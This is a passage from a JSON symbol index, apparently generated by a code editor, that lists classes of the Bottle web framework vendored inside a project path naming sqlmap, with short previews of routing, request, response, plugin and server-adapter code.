        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class RouteBuildError(RouteError):\n    \"\"\" The route could not be built. \"\"\"\ndef _re_flatten(p):\n    \"\"\" Turn all capturing groups in a regular expression pattern into\n        non-capturing groups. \"\"\"\n    if '(' not in p:\n        return p\n    return re.sub(r'(\\\\*)(\\(\\?P<[^>]+>|\\((?!\\?))', lambda m: m.group(0) if\n                  len(m.group(1)) % 2 else m.group(1) + '(?:', p)\nclass Router(object):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Router",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class Router(object):\n    \"\"\" A Router is an ordered collection of route->target pairs. It is used to\n        efficiently match WSGI requests against a number of routes and return\n        the first target that satisfies the request. The target may be anything,\n        usually a string, ID or callable object. A route consists of a path-rule\n        and a HTTP method.\n        The path-rule is either a static path (e.g. `/contact`) or a dynamic\n        path that contains wildcards (e.g. `/wiki/<page>`). The wildcard syntax\n        and details on the matching order are described in docs:`routing`.\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Route",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class Route(object):\n    \"\"\" This class wraps a route callback along with route specific metadata and\n        configuration and applies Plugins on demand. It is also responsible for\n        turning an URL path rule into a regular expression usable by the Router.\n    \"\"\"\n    def __init__(self, app, rule, method, callback,\n                 name=None,\n                 plugins=None,\n                 skiplist=None, **config):\n        #: The application this route is installed to.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "Bottle",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class Bottle(object):\n    \"\"\" Each Bottle object represents a single, distinct web application and\n        consists of routes, callbacks, plugins, resources and configuration.\n        Instances are callable WSGI applications.\n        :param catchall: If true (default), handle all exceptions. Turn off to\n                         let debugging middleware handle exceptions.\n    \"\"\"\n    @lazy_attribute\n    def _global_config(cls):\n        cfg = ConfigDict()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BaseRequest",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class BaseRequest(object):\n    \"\"\" A wrapper for WSGI environment dictionaries that adds a lot of\n        convenient access methods and properties. Most of them are read-only.\n        Adding new attributes to a request actually adds them to the environ\n        dictionary (as 'bottle.request.ext.<name>'). This is the recommended\n        way to store and access request-specific data.\n    \"\"\"\n    __slots__ = ('environ', )\n    #: Maximum size of memory buffer for :attr:`body` in bytes.\n    MEMFILE_MAX = 102400",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HeaderProperty",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class HeaderProperty(object):\n    def __init__(self, name, reader=None, writer=None, default=''):\n        self.name, self.default = name, default\n        self.reader, self.writer = reader, writer\n        self.__doc__ = 'Current value of the %r header.' % name.title()\n    def __get__(self, obj, _):\n        if obj is None: return self\n        value = obj.get_header(self.name, self.default)\n        return self.reader(value) if self.reader else value\n    def __set__(self, obj, value):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BaseResponse",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class BaseResponse(object):\n    \"\"\" Storage class for a response body as well as headers and cookies.\n        This class does support dict-like case-insensitive item-access to\n        headers, but is NOT a dict. Most notably, iterating over a response\n        yields parts of the body and not the headers.\n        :param body: The response body as one of the supported types.\n        :param status: Either an HTTP status code (e.g. 200) or a status line\n                       including the reason phrase (e.g. '200 OK').\n        :param headers: A dictionary or a list of name-value pairs.\n        Additional keyword arguments are added to the list of headers.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "LocalRequest",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class LocalRequest(BaseRequest):\n    \"\"\" A thread-local subclass of :class:`BaseRequest` with a different\n        set of attributes for each thread. There is usually only one global\n        instance of this class (:data:`request`). If accessed during a\n        request/response cycle, this instance always refers to the *current*\n        request (even on a multithreaded server). \"\"\"\n    bind = BaseRequest.__init__\n    environ = _local_property()\nclass LocalResponse(BaseResponse):\n    \"\"\" A thread-local subclass of :class:`BaseResponse` with a different",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "LocalResponse",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class LocalResponse(BaseResponse):\n    \"\"\" A thread-local subclass of :class:`BaseResponse` with a different\n        set of attributes for each thread. There is usually only one global\n        instance of this class (:data:`response`). Its attributes are used\n        to build the HTTP response at the end of the request/response cycle.\n    \"\"\"\n    bind = BaseResponse.__init__\n    _status_line = _local_property()\n    _status_code = _local_property()\n    _cookies = _local_property()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTPResponse",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class HTTPResponse(Response, BottleException):\n    def __init__(self, body='', status=None, headers=None, **more_headers):\n        super(HTTPResponse, self).__init__(body, status, headers, **more_headers)\n    def apply(self, other):\n        other._status_code = self._status_code\n        other._status_line = self._status_line\n        other._headers = self._headers\n        other._cookies = self._cookies\n        other.body = self.body\nclass HTTPError(HTTPResponse):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HTTPError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class HTTPError(HTTPResponse):\n    default_status = 500\n    def __init__(self,\n                 status=None,\n                 body=None,\n                 exception=None,\n                 traceback=None, **more_headers):\n        self.exception = exception\n        self.traceback = traceback\n        super(HTTPError, self).__init__(body, status, **more_headers)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "PluginError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class PluginError(BottleException):\n    pass\nclass JSONPlugin(object):\n    name = 'json'\n    api = 2\n    def __init__(self, json_dumps=json_dumps):\n        self.json_dumps = json_dumps\n    def setup(self, app):\n        app.config._define('json.enable', default=True, validate=bool,\n                          help=\"Enable or disable automatic dict->json filter.\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "JSONPlugin",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class JSONPlugin(object):\n    name = 'json'\n    api = 2\n    def __init__(self, json_dumps=json_dumps):\n        self.json_dumps = json_dumps\n    def setup(self, app):\n        app.config._define('json.enable', default=True, validate=bool,\n                          help=\"Enable or disable automatic dict->json filter.\")\n        app.config._define('json.ascii', default=False, validate=bool,\n                          help=\"Use only 7-bit ASCII characters in output.\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TemplatePlugin",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class TemplatePlugin(object):\n    \"\"\" This plugin applies the :func:`view` decorator to all routes with a\n        `template` config parameter. If the parameter is a tuple, the second\n        element must be a dict with additional options (e.g. `template_engine`)\n        or default variables for the template. \"\"\"\n    name = 'template'\n    api = 2\n    def setup(self, app):\n        app.tpl = self\n    def apply(self, callback, route):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_ImportRedirect",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class _ImportRedirect(object):\n    def __init__(self, name, impmask):\n        \"\"\" Create a virtual package that redirects imports (see PEP 302). \"\"\"\n        self.name = name\n        self.impmask = impmask\n        self.module = sys.modules.setdefault(name, imp.new_module(name))\n        self.module.__dict__.update({\n            '__file__': __file__,\n            '__path__': [],\n            '__all__': [],",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "MultiDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class MultiDict(DictMixin):\n    \"\"\" This dict stores multiple values per key, but behaves exactly like a\n        normal dict in that it returns only the newest value for any given key.\n        There are special methods available to access the full list of values.\n    \"\"\"\n    def __init__(self, *a, **k):\n        self.dict = dict((k, [v]) for (k, v) in dict(*a, **k).items())\n    def __len__(self):\n        return len(self.dict)\n    def __iter__(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "FormsDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class FormsDict(MultiDict):\n    \"\"\" This :class:`MultiDict` subclass is used to store request form data.\n        Additionally to the normal dict-like item access methods (which return\n        unmodified data as native strings), this container also supports\n        attribute-like access to its values. Attributes are automatically de-\n        or recoded to match :attr:`input_encoding` (default: 'utf8'). Missing\n        attributes default to an empty string. \"\"\"\n    #: Encoding used for attribute values.\n    input_encoding = 'utf8'\n    #: If true (default), unicode strings are first encoded with `latin1`",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "HeaderDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class HeaderDict(MultiDict):\n    \"\"\" A case-insensitive version of :class:`MultiDict` that defaults to\n        replace the old value instead of appending it. \"\"\"\n    def __init__(self, *a, **ka):\n        self.dict = {}\n        if a or ka: self.update(*a, **ka)\n    def __contains__(self, key):\n        return _hkey(key) in self.dict\n    def __delitem__(self, key):\n        del self.dict[_hkey(key)]",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "WSGIHeaderDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class WSGIHeaderDict(DictMixin):\n    \"\"\" This dict-like class wraps a WSGI environ dict and provides convenient\n        access to HTTP_* fields. Keys and values are native strings\n        (2.x bytes or 3.x unicode) and keys are case-insensitive. If the WSGI\n        environment contains non-native string values, these are de- or encoded\n        using a lossless 'latin1' character set.\n        The API will remain stable even on changes to the relevant PEPs.\n        Currently PEP 333, 444 and 3333 are supported. (PEP 444 is the only one\n        that uses non-native strings.)\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "ConfigDict",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class ConfigDict(dict):\n    \"\"\" A dict-like configuration storage with additional support for\n        namespaces, validators, meta-data, overlays and more.\n        This dict-like class is heavily optimized for read access. All read-only\n        methods as well as item access should be as fast as the built-in dict.\n    \"\"\"\n    __slots__ = ('_meta', '_change_listener', '_overlays', '_virtual_keys', '_source', '__weakref__')\n    def __init__(self):\n        self._meta = {}\n        self._change_listener = []",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "AppStack",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AppStack(list):\n    \"\"\" A stack-like list. Calling it returns the head of the stack. \"\"\"\n    def __call__(self):\n        \"\"\" Return the current default application. \"\"\"\n        return self.default\n    def push(self, value=None):\n        \"\"\" Add a new :class:`Bottle` instance to the stack \"\"\"\n        if not isinstance(value, Bottle):\n            value = Bottle()\n        self.append(value)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "WSGIFileWrapper",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class WSGIFileWrapper(object):\n    def __init__(self, fp, buffer_size=1024 * 64):\n        self.fp, self.buffer_size = fp, buffer_size\n        for attr in 'fileno', 'close', 'read', 'readlines', 'tell', 'seek':\n            if hasattr(fp, attr): setattr(self, attr, getattr(fp, attr))\n    def __iter__(self):\n        buff, read = self.buffer_size, self.read\n        part = read(buff)\n        while part:\n            yield part",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "_closeiter",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class _closeiter(object):\n    \"\"\" This only exists to be able to attach a .close method to iterators that\n        do not support attribute assignment (most of itertools). \"\"\"\n    def __init__(self, iterator, close=None):\n        self.iterator = iterator\n        self.close_callbacks = makelist(close)\n    def __iter__(self):\n        return iter(self.iterator)\n    def close(self):\n        for func in self.close_callbacks:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "ResourceManager",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class ResourceManager(object):\n    \"\"\" This class manages a list of search paths and helps to find and open\n        application-bound resources (files).\n        :param base: default value for :meth:`add_path` calls.\n        :param opener: callable used to open resources.\n        :param cachemode: controls which lookups are cached. One of 'all',\n                         'found' or 'none'.\n    \"\"\"\n    def __init__(self, base='./', opener=open, cachemode='all'):\n        self.opener = opener",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "FileUpload",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class FileUpload(object):\n    def __init__(self, fileobj, name, filename, headers=None):\n        \"\"\" Wrapper for file uploads. \"\"\"\n        #: Open file(-like) object (BytesIO buffer or temporary file)\n        self.file = fileobj\n        #: Name of the upload form field\n        self.name = name\n        #: Raw filename as sent by the client (may contain unsafe characters)\n        self.raw_filename = filename\n        #: A :class:`HeaderDict` with additional headers (e.g. content-type)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "ServerAdapter",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class ServerAdapter(object):\n    quiet = False\n    def __init__(self, host='127.0.0.1', port=8080, **options):\n        self.options = options\n        self.host = host\n        self.port = int(port)\n    def run(self, handler):  # pragma: no cover\n        pass\n    def __repr__(self):\n        args = ', '.join('%s=%s' % (k, repr(v))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "CGIServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class CGIServer(ServerAdapter):\n    quiet = True\n    def run(self, handler):  # pragma: no cover\n        from wsgiref.handlers import CGIHandler\n        def fixed_environ(environ, start_response):\n            environ.setdefault('PATH_INFO', '')\n            return handler(environ, start_response)\n        CGIHandler().run(fixed_environ)\nclass FlupFCGIServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "FlupFCGIServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class FlupFCGIServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        import flup.server.fcgi\n        self.options.setdefault('bindAddress', (self.host, self.port))\n        flup.server.fcgi.WSGIServer(handler, **self.options).run()\nclass WSGIRefServer(ServerAdapter):\n    def run(self, app):  # pragma: no cover\n        from wsgiref.simple_server import make_server\n        from wsgiref.simple_server import WSGIRequestHandler, WSGIServer\n        import socket",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "WSGIRefServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class WSGIRefServer(ServerAdapter):\n    def run(self, app):  # pragma: no cover\n        from wsgiref.simple_server import make_server\n        from wsgiref.simple_server import WSGIRequestHandler, WSGIServer\n        import socket\n        class FixedHandler(WSGIRequestHandler):\n            def address_string(self):  # Prevent reverse DNS lookups please.\n                return self.client_address[0]\n            def log_request(*args, **kw):\n                if not self.quiet:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "CherryPyServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class CherryPyServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        depr(0, 13, \"The wsgi server part of cherrypy was split into a new \"\n                    \"project called 'cheroot'.\", \"Use the 'cheroot' server \"\n                    \"adapter instead of cherrypy.\")\n        from cherrypy import wsgiserver # This will fail for CherryPy >= 9\n        self.options['bind_addr'] = (self.host, self.port)\n        self.options['wsgi_app'] = handler\n        certfile = self.options.get('certfile')\n        if certfile:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "CherootServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class CherootServer(ServerAdapter):\n    def run(self, handler): # pragma: no cover\n        from cheroot import wsgi\n        from cheroot.ssl import builtin\n        self.options['bind_addr'] = (self.host, self.port)\n        self.options['wsgi_app'] = handler\n        certfile = self.options.pop('certfile', None)\n        keyfile = self.options.pop('keyfile', None)\n        chainfile = self.options.pop('chainfile', None)\n        server = wsgi.Server(**self.options)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "WaitressServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class WaitressServer(ServerAdapter):\n    def run(self, handler):\n        from waitress import serve\n        serve(handler, host=self.host, port=self.port, _quiet=self.quiet, **self.options)\nclass PasteServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        from paste import httpserver\n        from paste.translogger import TransLogger\n        handler = TransLogger(handler, setup_console_handler=(not self.quiet))\n        httpserver.serve(handler,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "PasteServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class PasteServer(ServerAdapter):\n    def run(self, handler):  # pragma: no cover\n        from paste import httpserver\n        from paste.translogger import TransLogger\n        handler = TransLogger(handler, setup_console_handler=(not self.quiet))\n        httpserver.serve(handler,\n                         host=self.host,\n                         port=str(self.port), **self.options)\nclass MeinheldServer(ServerAdapter):\n    def run(self, handler):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "MeinheldServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class MeinheldServer(ServerAdapter):\n    def run(self, handler):\n        from meinheld import server\n        server.listen((self.host, self.port))\n        server.run(handler)\nclass FapwsServer(ServerAdapter):\n    \"\"\" Extremely fast webserver using libev. See http://www.fapws.org/ \"\"\"\n    def run(self, handler):  # pragma: no cover\n        depr(0, 13, \"fapws3 is not maintained and support will be dropped.\")\n        import fapws._evwsgi as evwsgi",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "FapwsServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class FapwsServer(ServerAdapter):\n    \"\"\" Extremely fast webserver using libev. See http://www.fapws.org/ \"\"\"\n    def run(self, handler):  # pragma: no cover\n        depr(0, 13, \"fapws3 is not maintained and support will be dropped.\")\n        import fapws._evwsgi as evwsgi\n        from fapws import base, config\n        port = self.port\n        if float(config.SERVER_IDENT[-2:]) > 0.4:\n            # fapws3 silently changed its API in 0.5\n            port = str(port)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TornadoServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class TornadoServer(ServerAdapter):\n    \"\"\" The super hyped asynchronous server by facebook. Untested. \"\"\"\n    def run(self, handler):  # pragma: no cover\n        import tornado.wsgi, tornado.httpserver, tornado.ioloop\n        container = tornado.wsgi.WSGIContainer(handler)\n        server = tornado.httpserver.HTTPServer(container)\n        server.listen(port=self.port, address=self.host)\n        tornado.ioloop.IOLoop.instance().start()\nclass AppEngineServer(ServerAdapter):\n    \"\"\" Adapter for Google App Engine. \"\"\"",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "AppEngineServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AppEngineServer(ServerAdapter):\n    \"\"\" Adapter for Google App Engine. \"\"\"\n    quiet = True\n    def run(self, handler):\n        depr(0, 13, \"AppEngineServer no longer required\",\n             \"Configure your application directly in your app.yaml\")\n        from google.appengine.ext.webapp import util\n        # A main() function in the handler script enables 'App Caching'.\n        # Lets makes sure it is there. This _really_ improves performance.\n        module = sys.modules.get('__main__')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "TwistedServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class TwistedServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n    def run(self, handler):\n        from twisted.web import server, wsgi\n        from twisted.python.threadpool import ThreadPool\n        from twisted.internet import reactor\n        thread_pool = ThreadPool()\n        thread_pool.start()\n        reactor.addSystemEventTrigger('after', 'shutdown', thread_pool.stop)\n        factory = server.Site(wsgi.WSGIResource(reactor, thread_pool, handler))",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "DieselServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class DieselServer(ServerAdapter):\n    \"\"\" Untested. \"\"\"\n    def run(self, handler):\n        depr(0, 13, \"Diesel is not tested or supported and will be removed.\")\n        from diesel.protocols.wsgi import WSGIApplication\n        app = WSGIApplication(handler, port=self.port)\n        app.run()\nclass GeventServer(ServerAdapter):\n    \"\"\" Untested. Options:\n        * See gevent.wsgi.WSGIServer() documentation for more options.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "GeventServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class GeventServer(ServerAdapter):\n    \"\"\" Untested. Options:\n        * See gevent.wsgi.WSGIServer() documentation for more options.\n    \"\"\"\n    def run(self, handler):\n        from gevent import pywsgi, local\n        if not isinstance(threading.local(), local.local):\n            msg = \"Bottle requires gevent.monkey.patch_all() (before import)\"\n            raise RuntimeError(msg)\n        if self.quiet:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "GunicornServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class GunicornServer(ServerAdapter):\n    \"\"\" Untested. See http://gunicorn.org/configure.html for options. \"\"\"\n    def run(self, handler):\n        from gunicorn.app.base import BaseApplication\n        if self.host.startswith(\"unix:\"):\n            config = {'bind': self.host}\n        else:\n            config = {'bind': \"%s:%d\" % (self.host, self.port)}\n        config.update(self.options)\n        class GunicornApplication(BaseApplication):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "EventletServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class EventletServer(ServerAdapter):\n    \"\"\" Untested. Options:\n        * `backlog` adjust the eventlet backlog parameter which is the maximum\n          number of queued connections. Should be at least 1; the maximum\n          value is system-dependent.\n        * `family`: (default is 2) socket family, optional. See socket\n          documentation for available families.\n    \"\"\"\n    def run(self, handler):\n        from eventlet import wsgi, listen, patcher",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "BjoernServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class BjoernServer(ServerAdapter):\n    \"\"\" Fast server written in C: https://github.com/jonashaag/bjoern \"\"\"\n    def run(self, handler):\n        from bjoern import run\n        run(handler, self.host, self.port, reuse_port=True)\nclass AsyncioServerAdapter(ServerAdapter):\n    \"\"\" Extend ServerAdapter for adding custom event loop \"\"\"\n    def get_event_loop(self):\n        pass\nclass AiohttpServer(AsyncioServerAdapter):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
        "label": "AsyncioServerAdapter",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "description": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "peekOfCode": "class AsyncioServerAdapter(ServerAdapter):\n    \"\"\" Extend ServerAdapter for adding custom event loop \"\"\"\n    def get_event_loop(self):\n        pass\nclass AiohttpServer(AsyncioServerAdapter):\n    \"\"\" Asynchronous HTTP client/server framework for asyncio\n        https://pypi.python.org/pypi/aiohttp/\n        https://pypi.org/project/aiohttp-wsgi/\n    \"\"\"\n    def get_event_loop(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.bottle.bottle",
        "documentation": {}
    },
    {
